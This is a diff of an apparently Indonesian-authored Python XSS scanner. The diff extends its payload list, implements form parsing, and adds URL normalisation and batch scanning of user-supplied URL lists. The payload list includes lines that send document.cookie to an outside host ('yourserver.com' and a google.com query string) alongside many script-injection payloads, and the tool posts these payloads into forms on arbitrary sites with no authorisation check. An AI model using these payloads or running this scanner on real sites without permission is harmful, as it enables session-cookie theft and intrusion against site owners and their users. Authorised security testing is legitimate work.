@@ -6,9 +6,9 @@ from urllib.parse import urljoin
 from colorama import Fore, Style
 
 print(
-    Fore.BLUE +
+    Fore.RED +
     """
-⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
 ⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
@@ -33,8 +33,8 @@ print(
 ⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀⠀
-                         
-        """ + Fore.RESET)
+                                                       
+    """ + Fore.RESET)
 
 print()
 print()
@@ -44,10 +44,22 @@ XSS_PAYLOADS = [
     "<script>alert('hi')</script>",
     "<img src=x onerror=alert('XSS')>",
     "<svg/onload=alert('XSS')>",
-    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
     "<body onload=alert('XSS')>",
     "<a href='javascript:alert(1)'>Click me</a>",
-    "<input type='text' value='\";alert(1);//'>",
+    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
+    "<marquee onstart=alert('XSS')>XSS</marquee>",
+    "<style>body{background:url('x') no-repeat;}</style>",
+    "<svg><script>alert('XSS')</script></svg>",
+    "<script>console.log('XSS')</script>",
+    "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
+    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+    "<w contenteditable id=x onfocus=alert()>",
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<a href='javascript:alert(1)'>Click me</a>",
     "<script>document.write('<img src=x onerror=alert(1)>')</script>",
     "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
     "<marquee onstart=alert('XSS')>XSS</marquee>",
@@ -80,7 +92,20 @@ class BaseXSSScanner:
         """
         Extract details from form like method, url, and inputs.
         """
-        raise NotImplementedError('Please implement get_form_details as per your needs.')
+        details = {}
+        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
+        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
+        
+        inputs = []
+        for input_tag in form.find_all("input"):
+            input_type = input_tag.attrs.get("type", "text")
+            input_name = input_tag.attrs.get("name")
+            inputs.append({"type": input_type, "name": input_name})
+
+        details["action"] = action
+        details["method"] = method
+        details["inputs"] = inputs
+        return details
 
     def _submit_form(self, form_details, url, value):
         """
@@ -124,13 +149,9 @@ class BaseXSSScanner:
 class XSSGameScanner(BaseXSSScanner):
     def get_form_details(self, form):
         details = {}
-        action = form.attrs.get("action")
-        if action is None:
-            action = ""  # Atau Anda bisa memberikan nilai default yang sesuai
-        else:
-            action = action.lower()
+        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
+        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
         
-        method = form.attrs.get("method", "get").lower()
         inputs = []
         for input_tag in form.find_all("input"):
             input_type = input_tag.attrs.get("type", "text")
@@ -142,30 +163,81 @@ class XSSGameScanner(BaseXSSScanner):
         details["inputs"] = inputs
         return details
 
+def normalize_url(url):
+    """
+    Normalize the URL by adding http:// if no scheme is provided.
+    """
+    if not url.startswith(('https://', 'https://')):
+        url = 'https://' + url
+    return url
+
+def check_url_status(url):
+    """
+    Check if the URL is reachable.
+    """
+    try:
+        response = requests.head(url, allow_redirects=True, timeout=5)
+        if response.status_code == 200:
+            print(f"{Fore.GREEN}[+] {url} is active.{Style.RESET_ALL}")
+            return True
+        else:
+            print(f"{Fore.YELLOW}[-] {url} returned status code: {response.status_code}{Style.RESET_ALL}")
+            return False
+    except requests.RequestException:
+        print(f"{Fore.RED}[!] {url} is not reachable.{Style.RESET_ALL}")
+        return False
+
 def main():
     print(f"{Fore.RED}[*] XSS Scanner Menu:{Style.RESET_ALL}")
     print("1. Scan URL")
-    print("2. Scan dari file list.txt")
-    print("3. Keluar")
+    print("2. Scan dari file list")
+    print("3. Cek status URL dari file list")
+    print("4. Keluar")
 
     pilihan = input("Pilih menu: ")
 
     if pilihan == "1":
         url = input("Masukkan URL: ")
+        url = normalize_url(url)  # Normalisasi URL
         scanner = XSSGameScanner(url)
         scanner.scan(url)
     elif pilihan == "2":
+        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
         try:
-            with open('list.txt', 'r') as file:
+            with open(file_name, 'r') as file:
                 urls = file.readlines()
                 for url in urls:
                     url = url.strip()  # Menghapus spasi di awal dan akhir
+                    url = normalize_url(url)  # Normalisasi URL
                     print(f"\n{Fore.BLUE}[*] Scanning {url}...{Style.RESET_ALL}")
                     scanner = XSSGameScanner(url)
                     scanner.scan(url)
         except FileNotFoundError:
-            print(f"{Fore.RED}[!] File list.txt tidak ditemukan!{Style.RESET_ALL}")
+            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")
     elif pilihan == "3":
+        active_urls = []
+        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
+        try:
+            with open(file_name, 'r') as file:
+                urls = file.readlines()
+                for url in urls:
+                    url = url.strip()  # Menghapus spasi di awal dan akhir
+                    url = normalize_url(url)  # Normalisasi URL
+                    print(f"\n{Fore.BLUE}[*] Checking status for {url}...{Style.RESET_ALL}")
+                    if check_url_status(url):
+                        active_urls.append(url)
+        except FileNotFoundError:
+            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")
+
+        # Simpan hasil URL aktif ke file
+        if active_urls:
+            with open('active_urls.txt', 'w') as f:
+                f.write("\n".join(active_urls))
+            print(f"{Fore.GREEN}[*] Hasil pengecekan URL aktif telah disimpan di active_urls.txt.{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}[*] Tidak ada URL aktif ditemukan.{Style.RESET_ALL}")
+
+    elif pilihan == "4":
         print("Keluar dari scanner.")
     else:
         print("Pilihan tidak valid. Silakan coba lagi.")
